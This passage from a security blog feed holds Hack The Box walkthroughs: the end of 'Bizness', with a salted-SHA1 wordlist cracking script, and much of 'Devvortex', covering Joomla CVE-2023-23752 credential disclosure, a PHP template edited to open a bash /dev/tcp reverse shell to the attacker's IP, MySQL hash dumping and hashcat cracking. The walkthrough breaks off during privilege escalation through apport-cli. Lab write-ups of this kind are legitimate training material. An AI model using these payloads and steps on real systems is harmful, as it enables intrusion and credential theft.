<span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>  
<span class="k">except</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">NoSuchAlgorithmException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
<span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error while computing hash of type </span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA1</span><span class="sh">"</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span>  
<span class="n">search</span> <span class="o">=</span> <span class="sh">"</span><span class="s">REDACTED</span><span class="sh">"</span>  
<span class="n">wordlist</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/share/wordlists/rockyou.txt</span><span class="sh">'</span>  
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">latin-1</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="n">value</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>  
<span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="c1"># print(hashed_password)  
</span><span class="k">if</span> <span class="n">hashed_password</span> <span class="o">==</span> <span class="n">search</span><span class="p">:</span>  
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Found Password:</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">, hash:</span><span class="si">{</span><span class="n">hashed_password</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <p>This script reads through a list of potential passwords (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), hashes each one using the specified algorithm and salt, and then compares the resulting hash to a target hash. If a match is found, it prints the plaintext password along with its hash.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$python3</span> solve.py 
Found Password:REDACTED, <span class="nb">hash</span>:<span class="nv">$SHA1$d$uP0_QaVBpDWFeo8</span><span class="nt">-REDACTED</span><span class="o">=</span>

</code></pre></div></div> <p>Switching to <code class="language-plaintext highlighter-rouge">root</code> and trying the password works, and the root flag is obtained.</p> <p><img src="/assets/img/20240123-bizness/20240123-rootflag.png" alt="20240123-rootflag.png" class="auto-resize"/></p> <h1 id="footnotes">Footnotes</h1> <ol> <li id="note1"> <a href="#ref1">↩</a> The command <code>rlwrap -cAr nc -lvnp 9010</code> is a combination of several utilities and options that are commonly used in reverse shell setups. Here's a breakdown of the command: <ul> <li><strong><code>rlwrap</code></strong>: <ul> <li>This is a utility that provides readline capabilities to commands that may not have them. Readline allows for command line editing, persistent history, and auto-completion. In the context of this command, <code>rlwrap</code> is used to enhance the functionality of <code>nc</code> (Netcat).</li> </ul> </li> <li><strong><code>-cAr</code></strong>: These are options for <code>rlwrap</code>: <ul> <li><code>-c</code>: Enables command completion.</li> <li><code>-A</code>: Enables command auto-completion.</li> <li><code>-r</code>: Keeps a history of commands.</li> </ul> </li> <li><strong><code>-lvnp 4321</code></strong>: These are options for <code>nc</code>: <ul> <li><code>-l</code>: Puts Netcat into listening mode, where it waits for incoming connections.</li> <li><code>-v</code>: Verbose mode. Netcat will provide more information about what it's doing.</li> <li><code>-n</code>: No DNS. Tells Netcat not to resolve hostnames via DNS. This can speed up operations if DNS resolution is not required.</li> <li><code>-p 4321</code>: Specifies the port number on which Netcat will listen for incoming connections.</li> </ul> </li> </ul> So, putting it all together, <code>rlwrap -cAr nc -lvnp 4321</code> runs Netcat in listening mode on port 4321 with enhanced readline capabilities provided by <code>rlwrap</code>. This setup is typically used when you're expecting to receive a reverse shell, and you want the ability to interact with that shell more effectively using command history and completion. </li> <li id="note2"> <a href="#ref2">↩</a> <ul> <li><strong><code>find seg0 -type f</code></strong>: <ul> <li><code>find</code>: This is a command used to search for files in a directory hierarchy.</li> <li><code>seg0</code>: This specifies the directory where the <code>find</code> command starts its search. In this case, it's looking in the <code>seg0</code> directory.</li> <li><code>-type f</code>: This option tells <code>find</code> to look for files (not directories).</li> </ul> </li> <li><strong><code>-exec cat {} \;</code></strong>: <ul> <li><code>-exec</code>: This option of the <code>find</code> command allows you to execute another command on each of the files found.</li> <li><code>cat {}</code>: This is the command that <code>find</code> will execute on each file. <code>cat</code> is a standard Unix utility that reads files and outputs their content. The <code>{}</code> is a placeholder for each file <code>find</code> locates.</li> <li><code>\;</code>: This is a delimiter that indicates the end of the <code>exec</code> command.</li> </ul> </li> <li><strong><code>&gt; dir.txt</code></strong>: <ul> <li><code>&gt;</code>: This is an output redirection operator in Unix/Linux. It directs the output from the preceding command to a file.</li> <li><code>dir.txt</code>: This is the file into which the output of the previous commands will be saved.</li> </ul> </li> </ul> </li> </ol>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="SSRF"/><category term="authentication-bypass"/><category term="persistence"/><category term="linpeas"/><summary type="html"><![CDATA[Bizness - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Devvortex</title><link href="https://emdeh.github.io/blog/2024/devvortex-walkthrough/" rel="alternate" type="text/html" title="Devvortex"/><published>2024-01-15T14:14:00+00:00</published><updated>2024-01-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/devvortex-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/devvortex-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called <em>Joomla</em>.</p> <p>An exploit is then used to perform an <strong>Unauthenticated Information Disclosure.</strong></p> <p>This results in stealing MySQL credentials which are <strong>re-used</strong> to authenticate to the Joomla admin panel.</p> <p>From there a reverse shell is obtained by modifying the <code class="language-plaintext highlighter-rouge">login.php</code>. Once the reverse shell is established the MySQL database is enumerated to obtain two hashes. Once a hash is cracked, SSH is used to log on.</p> <p><strong>Privilege escalation</strong> is achieved by exploiting a vulnerability in the <code class="language-plaintext highlighter-rouge">apport-cli</code> utility, which the user has <code class="language-plaintext highlighter-rouge">sudo</code> rights over. This ultimately spawns a privileged shell.</p> <h2 id="methods">Methods</h2> <h3 id="unauthenticated-information-disclosure">Unauthenticated information disclosure</h3> <p>Unauthenticated Information Disclosure refers to a security vulnerability where sensitive information is exposed without requiring authentication. It means that confidential data, such as personal details, configuration files, or database records, can be accessed by anyone without needing to log in or bypass security controls.</p> <p>This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.</p> <p>In this case, an outdated Joomla version was exploited to obtain clear-text credentials.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure sensitive information is not vulnerable to unauthenticated disclosure, keep systems patched, and encrypt sensitive data.</p> </blockquote> <h3 id="credential-stuffing">Credential stuffing</h3> <p>Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites. It’s a widespread method for gaining unauthorised access due to the commonality of password reuse.</p> <p>In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure passwords are not re-used across different services.</p> </blockquote> <h3 id="password-cracking">Password cracking</h3> <p>Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password’s strength and the method used.</p> <p>In this case, the hashes stolen from the MySQL database were cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p> <p><strong>Mitigation:</strong> Ensure complex passwords are used.</p> <h1 id="enumeration">Enumeration</h1> <p>Enumeration, as always starts with Nmap.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.15.24 <span class="nt">-oN</span> - | <span class="nb">tee </span>devvortex-initial-scan.txt
</code></pre></div></div> <blockquote> <p><em>To output Nmap scan results to a file while also displaying them in the terminal, you can use the <code class="language-plaintext highlighter-rouge">-oN</code> option along with the <code class="language-plaintext highlighter-rouge">tee</code> command in Linux. The <code class="language-plaintext highlighter-rouge">-oN</code> option in Nmap is used to output the scan results to a file in a normal, human-readable format. The <code class="language-plaintext highlighter-rouge">tee</code> command in Unix-like operating systems reads from standard input and writes to both standard output and one or more files simultaneously.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Sun Jan 14 23:30:42 2024 as: nmap -sC -sV -oN - 10.129.15.24
Nmap scan report for 10.129.15.24
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 23:31:37 2024 -- 1 IP address (1 host up) scanned in 54.86 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Two ports open, 22 and 80.</li> <li>Domain name http://devvortex.htb/ found.</li> </ol> <h2 id="subdomain-scanning">Subdomain scanning</h2> <p>Adding the domain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file allows for the site to be browsed and reveals a landing page.</p> <p><img src="/assets/img/20240115-devvortext-landingpage1.png" alt="20240115-devvortext-landingpage1.png" class="auto-resize"/></p> <p>The site was then scanned for subdomains.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://devvortex.htb/ <span class="nt">-H</span> <span class="s1">'Host:FUZZ.devvortex.htb'</span> <span class="nt">-t</span> 50 <span class="nt">--hc</span> 302 <span class="o">&gt;</span> subdomain-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <ul> <li>The <code class="language-plaintext highlighter-rouge">-t 50</code> instructs wfuzz to have up to 50 concurrent connections which will speed up the scan.</li> <li>The <code class="language-plaintext highlighter-rouge">--hc 302</code> flag stands for “Hide Code”. This option instructs wfuzz not to display results with the 302 status code. This can be helpful to filter out some of the redirection noise.</li> </ul> <h3 id="findings-1">Findings</h3> <p>The subdomain <code class="language-plaintext highlighter-rouge">dev</code> was identified.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                           

Total time: 0
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 0
</code></pre></div></div> <p>This is added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to allow the site to be browsed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/scans]
└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
&lt;SNIP&gt;
10.129.15.24    devvortex.htb dev.devvortex.htb
</code></pre></div></div> <p>Navigating to the subdomain reveals another landing page.</p> <p><img src="/assets/img/20240115-devvortext-cover-landingpage2.png" alt="20240115-devvortext-cover-landingpage2.png" class="auto-resize"/></p> <h2 id="subdomain-directory-scanning">Subdomain directory scanning</h2> <p>The newly identified subdomain <code class="language-plaintext highlighter-rouge">dev.devvortex.htb</code> can be fuzzed again for pages.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt <span class="nt">-u</span> http://dev.devvortex.htb/FUZZ <span class="nt">-t</span> 200 <span class="nt">--hc</span> 404,403 <span class="o">&gt;</span> subdomain-directory-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <h3 id="findings-2">Findings</h3> <p>The fuzzing revealed a number of directories on the subdomain. Lets start with the <code class="language-plaintext highlighter-rouge">administrator</code> directory.</p> <p><img src="/assets/img/20240115-devvortext-domainfuzzing.png" alt="20240115-devvortext-domainfuzzing.png" class="auto-resize"/></p> <p>Navigating to the <code class="language-plaintext highlighter-rouge">/administrator</code> page reveals a <strong>Joomla</strong> landing page.</p> <p><img src="/assets/img/20240115-devvortext-joomlapage.png" alt="20240115-devvortext-joomlapage.png" class="auto-resize"/></p> <h3 id="what-is-joomla">What is Joomla</h3> <p>Joomla is a popular, open-source Content Management System (CMS) used to build, manage, and publish content for websites, blogs, and online applications. It is written in PHP and uses a <strong>MySQL</strong> database to store content and settings.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="joomla-compromise">Joomla compromise</h2> <p>Checking the subdomain’s README.txt file reveals the Joomla version as 4.2.</p> <p>A quick search of <code class="language-plaintext highlighter-rouge">searchsploit</code> and we find a promising exploit.</p> <p><img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize"/></p> <p>Using the <code class="language-plaintext highlighter-rouge">mirror</code> command the exploit can be copied to a working directory.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/51334.py
</code></pre></div></div> <p>This exploit ran into some library issues so another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752</p> <p>The exploit executed successfully and identified two users, site details and database information including credentials.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ./CVE-2023-23752 http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

</code></pre></div></div> <p>Password stuffing Lewis’ credentials on the <code class="language-plaintext highlighter-rouge">/administrator</code> page resulted in a successful authentication.</p> <p>Checking SSH with Lewis’ credentials revealed no further credential re-use.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>ssh lewis@10.129.15.24        
lewis@10.129.15.24<span class="s1">'s password: 
Permission denied, please try again.
lewis@10.129.15.24'</span>s password: 
</code></pre></div></div> <h2 id="foothold---php-reverse-shell">Foothold - PHP reverse shell</h2> <p>On the admin panel is a warning about the server using an outdated version of PHP.</p> <p><img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize"/></p> <p>Moving to <code class="language-plaintext highlighter-rouge">/System/Templates/Administrator Templates</code>, it was identified that the user has access to the PHP templates. The <code class="language-plaintext highlighter-rouge">login.php</code> was edited to send a reverse shell when the page is served.</p> <p>The modification made was:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 00&gt;&amp;1"'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">system()</code> <em>Function in PHP</em>: This is a PHP function that is used to execute an external program. The <code class="language-plaintext highlighter-rouge">system</code> function will execute the given command and output the result. In this context, it is being used to execute a bash command.</li> <li><code class="language-plaintext highlighter-rouge">bash -c</code>: This tells the system to execute the following string with Bash.</li> <li><code class="language-plaintext highlighter-rouge">"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 0&lt;&amp;1"</code>: This is the string command that Bash executes.</li> <li><code class="language-plaintext highlighter-rouge">bash -i</code>: This starts an interactive Bash shell (<code class="language-plaintext highlighter-rouge">-i</code> flag for interactive).</li> <li><code class="language-plaintext highlighter-rouge">&gt;&amp; /dev/tcp/10.10.14.16/4321</code>: This redirects the standard output (stdout) of the shell to a TCP connection to the specified IP address and port.</li> <li><code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code>: This part redirects the standard input (stdin) to the shell from the same TCP connection. The <code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code> means to take input (file descriptor 0) from the same place as the standard output (file descriptor 1).</li> </ul> <blockquote> <p><em>The <code class="language-plaintext highlighter-rouge">&gt;&amp;</code> operator is shorthand for redirecting both stdout (1) and stderr (2).</em></p> </blockquote> <p><img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize"/></p> <p>Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4321
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.15.24] 45554
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>856<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@devvortex:~/dev.devvortex.htb/administrator<span class="nv">$ </span>

</code></pre></div></div> <h3 id="shell-stabilisation">Shell stabilisation</h3> <p>Now the shell can be stabilised before proceeding.</p> <p><img src="/assets/img/20240115-devvortext-shellupgrade.png" alt="20240115-devvortext-shellupgrade.png" class="auto-resize"/></p> <p>As shown above, running these commands sequentially, and then hitting enter a few times, will return a more interactive and stable shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>  
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm  
ctrl + z  
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div> <p>The sequence of commands will upgrade a basic shell into a fully interactive shell. This is often necessary because simple reverse shells can be quite limited (e.g., no tab completion, no interactive commands). Here’s a brief explanation of each step:</p> <ol> <li><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>: <ul> <li>This command uses Python to spawn a new bash shell with pseudo-terminal (pty) support. This improves the shell’s interactivity and handling of certain commands.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code>: <ul> <li>After the Python command gives you a more functional shell, set the <code class="language-plaintext highlighter-rouge">TERM</code> environment variable to <code class="language-plaintext highlighter-rouge">xterm</code>. This tells the shell what kind of terminal it’s running in, allowing for better formatting and functionality (like clear screen, command history).</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">Ctrl + Z</code>: <ul> <li>This key combination suspends the current foreground process (the shell), returning control to your local terminal without closing the shell.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>: <ul> <li><code class="language-plaintext highlighter-rouge">stty raw -echo</code>: This configures the terminal. <code class="language-plaintext highlighter-rouge">raw</code> mode means input characters are passed to the foreground process immediately, and <code class="language-plaintext highlighter-rouge">-echo</code> turns off input echoing, preventing characters from being displayed twice.</li> <li><code class="language-plaintext highlighter-rouge">fg</code>: This command brings the suspended process (your bash shell) back to the foreground.</li> </ul> </li> <li><strong>Hit Enter a Few Times</strong>: <ul> <li>Sometimes, after running these commands, you might need to hit enter a few times to get the prompt of the interactive shell.</li> </ul> </li> </ol> <h2 id="lateral-movement---mysql">Lateral movement - MySQL</h2> <p>Recall the credentials found with the Joomla exploit earlier:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
</code></pre></div></div> <p>Trying them on the reverse shell is successful.</p> <pre><code class="language-mysql">mysql -h localhost -u lewis -p '&lt;REDACTED&gt;'
</code></pre> <pre><code class="language-mysql">www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8889
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;  
+-------------------------------+  
| Tables_in_joomla |  
+-------------------------------+  
| sd4fg_action_log_config |  
| sd4fg_action_logs |  
| sd4fg_action_logs_extensions |  
| sd4fg_action_logs_users |  
| sd4fg_assets |  
| sd4fg_associations |  
| sd4fg_banner_clients |  
| sd4fg_banner_tracks |
&lt;SNIP&gt;
| sd4fg_users |

mysql&gt; select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | &lt;REDACTED&gt; | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | &lt;REDACTED&gt; | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

</code></pre> <p>As shown above, two hashes were stolen from the database.</p> <p><img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize"/></p> <h2 id="cracking-the-passwords">Cracking the passwords</h2> <p>Using Hashcat, one of the hashes is quickly cracked.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/credentials]
└─<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hashes /usr/share/wordlists/rockyou.txt       
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
&lt;SNIP&gt;
&lt;REDACTED&gt;

</code></pre></div></div> <p>This hash corresponds to the user <code class="language-plaintext highlighter-rouge">logan</code>.</p> <h2 id="ssh">SSH</h2> <p>Trying the password on SSH is successful.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ ssh logan@10.129.15.24
logan@10.129.15.24's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Jan 2024 06:46:03 AM UTC

  System load:           0.0
  Usage of /:            64.2% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             177
  Users logged in:       0
  IPv4 address for eth0: 10.129.15.24
  IPv6 address for eth0: dead:beef::250:56ff:fe96:b12d

  =&gt; There are 8 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ 

</code></pre></div></div> <p>Grab the first flag!</p> <p><img src="/assets/img/20240115-devvortext-userflag.png" alt="20240115-devvortext-userflag.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> lists the binaries <code class="language-plaintext highlighter-rouge">logan</code> can run with root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>logan@devvortex:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>logan on devvortex:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User logan may run the following commands on devvortex:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/apport-cli

</code></pre></div></div> <p>We can see here that <code class="language-plaintext highlighter-rouge">logan</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/apport-cli</code>.</p> <h2 id="what-is-apport-cli">What is apport-cli</h2> <p><code class="language-plaintext highlighter-rouge">apport-cli</code> is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.</p> <p>A key feature of the utility is a <strong>Command-Line Interface</strong>. As a CLI tool, <code class="language-plaintext highlighter-rouge">apport-cli</code> allows users to interact with the Apport crash reporting system directly from the terminal. This is particularly useful for servers or other systems where a graphical user interface (GUI) is not available.</p> <h2 id="exploiting-apport-cli">Exploiting apport-cli</h2> <p>The help menu reveals a number of options.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: apport-cli <span class="o">[</span>options] <span class="o">[</span>symptom|pid|package|program path|.apport/.crash file]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-f</span>, <span class="nt">--file-bug</span>        Start <span class="k">in </span>bug filing mode. Requires <span class="nt">--package</span> and an
                        optional <span class="nt">--pid</span>, or just a <span class="nt">--pid</span><span class="nb">.</span> If neither is given,
                        display a list of known symptoms. <span class="o">(</span>Implied <span class="k">if </span>a single
                        argument is given.<span class="o">)</span>
  <span class="nt">-w</span>, <span class="nt">--window</span>          Click a window as a target <span class="k">for </span>filing a problem
                        report.
